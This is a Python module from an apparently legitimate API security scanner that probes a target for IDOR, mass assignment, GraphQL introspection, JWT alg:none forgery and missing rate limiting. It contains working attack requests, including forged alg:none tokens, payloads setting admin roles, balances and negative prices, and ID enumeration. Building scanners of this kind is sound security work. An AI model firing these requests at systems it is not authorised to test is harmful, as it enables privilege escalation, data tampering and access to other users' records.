"""API Security Executor — tests for IDOR, Mass Assignment, GraphQL, JWT issues.

SECURITY: Uses httpx DIRECTLY — never CLI transport with payloads (T-02 mitigation).
Implements OWASP API Security Top 10 (2023) testing patterns.
"""

import json
from typing import Dict, List, Optional

import httpx

from erebos.core.finding import Finding, FindingEvidence, Phase, Severity


class ApiSecurityExecutor:
    """HTTP-based API security testing executor."""

    def __init__(
        self,
        timeout: float = 10.0,
        max_concurrent: int = 5,
        auth_token: Optional[str] = None,
        auth_header: str = "Authorization",
    ):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.auth_token = auth_token
        self.auth_header = auth_header

    async def run(
        self,
        target: str,
        endpoints: Optional[List[str]] = None,
        tests: Optional[List[str]] = None,
        auth_token: Optional[str] = None,
    ) -> List[Finding]:
        """Run API security tests.

        Args:
            target: Base API URL.
            endpoints: Specific endpoints to test. If None, discovers from common paths.
            tests: Which tests to run. Options: idor, mass_assignment, graphql, jwt, rate_limit.
            auth_token: Override auth token (e.g., from DAST auth bypass finding).
        """
        if auth_token:
            self.auth_token = auth_token

        if tests is None:
            tests = ["idor", "mass_assignment", "graphql", "jwt", "rate_limit"]

        findings: List[Finding] = []

        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
        ) as client:
            if "idor" in tests:
                findings.extend(await self._test_idor(client, target, endpoints))
            if "mass_assignment" in tests:
                findings.extend(await self._test_mass_assignment(client, target, endpoints))
            if "graphql" in tests:
                findings.extend(await self._test_graphql(client, target))
            if "jwt" in tests:
                findings.extend(await self._test_jwt(client, target))
            if "rate_limit" in tests:
                findings.extend(await self._test_rate_limit(client, target, endpoints))

        return findings

    async def _test_idor(
        self, client: httpx.AsyncClient, target: str, endpoints: Optional[List[str]]
    ) -> List[Finding]:
        """Test for Insecure Direct Object References (BOLA - API1:2023)."""
        findings: List[Finding] = []

        # Common IDOR patterns
        idor_paths = endpoints or [
            "/api/users/1",
            "/api/users/2",
            "/api/v1/users/1",
            "/api/v1/account/1",
            "/api/orders/1",
            "/api/documents/1",
        ]

        headers = self._auth_headers()

        for path in idor_paths:
            try:
                url = f"{target.rstrip('/')}{path}"
                resp = await client.get(url, headers=headers)

                if resp.status_code == 200:
                    # Try accessing another user's resource
                    alt_path = self._increment_id(path)
                    alt_url = f"{target.rstrip('/')}{alt_path}"
                    alt_resp = await client.get(alt_url, headers=headers)

                    if alt_resp.status_code == 200:
                        findings.append(Finding(
                            tool="erebos-api-security",
                            severity=Severity.HIGH,
                            title=f"Potential IDOR at {path}",
                            description=(
                                f"Accessed resource at {alt_path} with same credentials. "
                                f"Both requests returned 200 OK, suggesting missing "
                                f"object-level authorization (BOLA/IDOR)."
                            ),
                            target=target,
                            evidence=FindingEvidence(
                                url=alt_url,
                                output=f"Original: {resp.status_code}, Alt: {alt_resp.status_code}",
                            ),
                            cwe="CWE-639",
                            phase_found=Phase.VULN_SCAN,
                        ))
            except (httpx.TimeoutException, httpx.ConnectError):
                continue

        return findings

    async def _test_mass_assignment(
        self, client: httpx.AsyncClient, target: str, endpoints: Optional[List[str]]
    ) -> List[Finding]:
        """Test for Mass Assignment (API6:2023).

        Tests both PUT and PATCH with dangerous fields. Supports auth chaining.
        """
        findings: List[Finding] = []
        headers = self._auth_headers()
        headers["Content-Type"] = "application/json"

        # Dangerous fields that shouldn't be assignable
        dangerous_payloads = [
            {"role": "admin"},
            {"isAdmin": True},
            {"is_admin": True},
            {"admin": True},
            {"permissions": ["admin", "superuser"]},
            {"verified": True},
            {"email_verified": True},
            {"balance": 99999},
            {"credits": 99999},
            {"price": -1},
            {"deluxePrice": 0},
            {"quantity": 99999},
        ]

        update_paths = endpoints or [
            "/Users/1",
            "/Products/1",
            "/Products/2",
            "/BasketItems/1",
            "/api/users/me",
            "/api/v1/profile",
            "/api/account",
        ]

        for path in update_paths:
            url = f"{target.rstrip('/')}{path}"
            try:
                # First GET to see current state
                get_resp = await client.get(url, headers=headers)
                if get_resp.status_code not in (200, 201):
                    continue

                original_body = get_resp.text  # noqa: F841 — kept for future diff comparison

                # Try PUT and PATCH with dangerous fields
                for payload in dangerous_payloads:
                    field = next(iter(payload.keys()))
                    patch_data = json.dumps(payload)

                    # Try PUT first (more permissive in many frameworks)
                    for method_fn in [client.put, client.patch]:
                        try:
                            resp = await method_fn(url, content=patch_data, headers=headers)
                        except Exception:
                            continue

                        if resp.status_code in (200, 201, 204):
                            resp_body = resp.text
                            # Check if the dangerous field appears in response
                            # and the value was accepted (not just echoed from before)
                            if field in resp_body:
                                # Verify the value changed
                                try:
                                    resp_json = resp.json()
                                    data = resp_json.get("data", resp_json)
                                    if isinstance(data, dict) and field in data:
                                        new_val = data[field]
                                        expected = payload[field]
                                        if new_val == expected or str(new_val) == str(expected):
                                            method_name = (
                                                "PUT" if method_fn == client.put else "PATCH"
                                            )
                                            findings.append(Finding(
                                                tool="erebos-api-security",
                                                severity=Severity.HIGH,
                                                title=(
                                                    f"Mass Assignment: '{field}' accepted "
                                                    f"via {method_name} at {path}"
                                                ),
                                                description=(
                                                    f"The API accepted assignment of privileged "
                                                    f"field '{field}={expected}' via {method_name}. "
                                                    f"This could allow privilege escalation or "
                                                    f"business logic bypass."
                                                ),
                                                target=target,
                                                evidence=FindingEvidence(
                                                    url=url,
                                                    payload=patch_data,
                                                    output=resp.text[:300],
                                                ),
                                                cwe="CWE-915",
                                                phase_found=Phase.VULN_SCAN,
                                            ))
                                            break  # One finding per field per endpoint
                                except (json.JSONDecodeError, AttributeError):
                                    pass
                        break  # If PUT worked (200 or 4xx), don't try PATCH

            except (httpx.TimeoutException, httpx.ConnectError):
                continue
            except Exception:
                continue

        return findings

    async def _test_graphql(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Finding]:
        """Test for GraphQL introspection and injection (API8:2023)."""
        findings: List[Finding] = []
        headers = self._auth_headers()
        headers["Content-Type"] = "application/json"

        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]

        introspection_query = json.dumps({
            "query": "{ __schema { types { name fields { name } } } }"
        })

        for path in graphql_paths:
            url = f"{target.rstrip('/')}{path}"
            try:
                resp = await client.post(url, content=introspection_query, headers=headers)

                if resp.status_code == 200:
                    body = resp.text
                    if "__schema" in body or "__type" in body:
                        findings.append(Finding(
                            tool="erebos-api-security",
                            severity=Severity.MEDIUM,
                            title=f"GraphQL Introspection Enabled at {path}",
                            description=(
                                "GraphQL introspection is enabled in production, "
                                "exposing the entire API schema including internal "
                                "types and mutations."
                            ),
                            target=target,
                            evidence=FindingEvidence(
                                url=url,
                                payload=introspection_query,
                                output=body[:300],
                            ),
                            cwe="CWE-200",
                            phase_found=Phase.VULN_SCAN,
                        ))
            except (httpx.TimeoutException, httpx.ConnectError):
                continue

        return findings

    async def _test_jwt(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Finding]:
        """Test for JWT vulnerabilities (API2:2023)."""
        findings: List[Finding] = []

        if not self.auth_token:
            return findings

        # Test: JWT with alg:none
        parts = self.auth_token.split(".")
        if len(parts) == 3:
            import base64

            # Try alg:none attack
            try:
                header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
                header = json.loads(base64.urlsafe_b64decode(header_b64))

                if header.get("alg") in ("HS256", "HS384", "HS512", "RS256"):
                    # Craft none-alg token
                    none_header = base64.urlsafe_b64encode(
                        json.dumps({"alg": "none", "typ": "JWT"}).encode()
                    ).decode().rstrip("=")
                    forged_token = f"{none_header}.{parts[1]}."

                    headers = {self.auth_header: f"Bearer {forged_token}"}
                    resp = await client.get(
                        f"{target.rstrip('/')}/api/users/me", headers=headers
                    )

                    if resp.status_code == 200:
                        findings.append(Finding(
                            tool="erebos-api-security",
                            severity=Severity.CRITICAL,
                            title="JWT Algorithm None Bypass",
                            description=(
                                "The API accepts JWTs with alg:none, allowing "
                                "any user to forge valid tokens without the signing key."
                            ),
                            target=target,
                            evidence=FindingEvidence(
                                url=f"{target}/api/users/me",
                                payload="alg:none forged token",
                                output=f"Status: {resp.status_code}",
                            ),
                            cwe="CWE-347",
                            phase_found=Phase.VULN_SCAN,
                        ))
            except Exception:
                pass

        return findings

    async def _test_rate_limit(
        self, client: httpx.AsyncClient, target: str, endpoints: Optional[List[str]]
    ) -> List[Finding]:
        """Test for missing rate limiting (API4:2023)."""
        findings: List[Finding] = []
        headers = self._auth_headers()

        test_paths = endpoints or ["/api/login", "/api/auth/token", "/api/v1/auth"]

        for path in test_paths:
            url = f"{target.rstrip('/')}{path}"
            success_count = 0

            try:
                for _ in range(20):
                    resp = await client.post(
                        url,
                        content=json.dumps({"email": "test@test.com", "password": "test"}),
                        headers={**headers, "Content-Type": "application/json"},
                    )
                    if resp.status_code != 429:
                        success_count += 1
                    else:
                        break

                if success_count >= 20:
                    findings.append(Finding(
                        tool="erebos-api-security",
                        severity=Severity.MEDIUM,
                        title=f"No Rate Limiting on {path}",
                        description=(
                            f"Sent 20 requests to {path} without receiving HTTP 429. "
                            f"Missing rate limiting enables brute-force attacks."
                        ),
                        target=target,
                        evidence=FindingEvidence(
                            url=url,
                            output="20/20 requests returned non-429 status",
                        ),
                        cwe="CWE-770",
                        phase_found=Phase.VULN_SCAN,
                    ))
            except (httpx.TimeoutException, httpx.ConnectError):
                continue

        return findings

    def _auth_headers(self) -> Dict[str, str]:
        """Build authentication headers."""
        headers: Dict[str, str] = {}
        if self.auth_token:
            headers[self.auth_header] = f"Bearer {self.auth_token}"
        return headers

    @staticmethod
    def _increment_id(path: str) -> str:
        """Increment numeric IDs in a path for IDOR testing."""
        import re
        def replace_id(match: re.Match) -> str:
            num = int(match.group())
            return str(num + 1)
        return re.sub(r'\d+', replace_id, path, count=1)
